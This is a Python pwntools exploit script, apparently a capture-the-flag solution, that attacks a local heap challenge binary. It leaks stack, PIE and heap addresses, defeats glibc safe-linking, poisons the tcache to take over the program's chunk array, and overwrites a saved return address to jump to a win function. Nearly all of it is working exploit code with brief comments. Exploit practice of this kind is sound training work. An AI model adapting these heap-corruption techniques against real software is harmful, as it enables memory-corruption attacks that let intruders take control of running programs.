from pwn import *

STACK_CHOICE = 0xd3
PIE_CHOICE = 0x83

target = process("./chall-00")
#gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

# Our I/O Wrapper Functions
def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"1")
	target.recvuntil(b"Enter the chunk size between 0x0-0x5f0:\n")
	target.sendline(bytes(str(chunk_size), "utf-8"))
	target.recvuntil(b"Which chunk spot would you like to allocate?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def view_chunk(chunk_idx: int) -> bytes:
	target.recvuntil(MENU_STRING)
	target.sendline(b"2")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Chunk Contents: ")
	contents = target.recvuntil(b"\x0d\x0a")
	return contents[:-2]

def edit_chunk(chunk_idx: int, chunk_contents: bytes) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"3")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Please input new chunk content:\n")
	target.sendline(chunk_contents)

def free_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"4")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def remove_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"5")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret(chunk_idx: int, choice: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"6")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Choice?\n")
	target.sendline(bytes(str(choice), "utf-8"))

# Allocate our starting 4 chunks
allocate_new_chunk(0x500, 0)
allocate_new_chunk(0x80, 2)
allocate_new_chunk(0x500, 1)
allocate_new_chunk(0x80, 3)


# Get the stack infoleak
secret(0x00, STACK_CHOICE)
chunk_contents = view_chunk(0)
stack_leak_contents = chunk_contents[0:6]
stack_leak = u64(stack_leak_contents + b"\x00"*2)

# Get the pie infoleak
secret(0x00, PIE_CHOICE)
chunk_contents = view_chunk(0)
pie_leak_contents = chunk_contents[0:6]
pie_leak = u64(pie_leak_contents + b"\x00"*2)

# Insert the two 0x500 byte chunks
# into the unsorted bin
# for the heap infoleak 
free_chunk(0)
free_chunk(1)


# Get the heap infoleak
chunk_contents = view_chunk(1)
heap_leak_contents = chunk_contents[0:6]
heap_leak = u64(heap_leak_contents + b"\x00"*2)

# Calculate needed addresses, using leaks and offsets
heap_base = heap_leak - 0x16b0
pie_base = pie_leak - 0x173d

win_address = pie_base + 0x12d0
edit_ret_address = stack_leak + 0x38
chunks_address = pie_base + 0x4040

tcache_chunk_address = heap_base + 0x1bd0
mangled_next = (tcache_chunk_address >> 12) ^ chunks_address


print("Stack Leak is: " + hex(stack_leak))
print("Heap Leak is: " + hex(heap_leak))
print("PIE Leak is: " + hex(pie_leak))

print("Mangled Next is: " + hex(mangled_next))
print("Stack Target is: " + hex(edit_ret_address))
print("Win Address is: " + hex(win_address))
print("Chunks Address is: " + hex(chunks_address))


# Insert two chunks into the tcache
free_chunk(3)
free_chunk(2)

# Overwrite next ptr of one of the current tcache head
# to chunks
edit_chunk(2, p64(mangled_next))

# Allocate tcache head, set chunks to next head
allocate_new_chunk(0x80, 4)

# Actually allocate a ptr to bss chunks array
allocate_new_chunk(0x80, 5)

# Overwrite first entry of chunks array with ptr to where
# return address for `edit_chunk` is stored
edit_chunk(5, p64(edit_ret_address))

# From within the `edit_chunk` function
# use `fgets` call to overwrite saved return address
# on the stack, call you_win
edit_chunk(0, p64(win_address))

target.interactive()
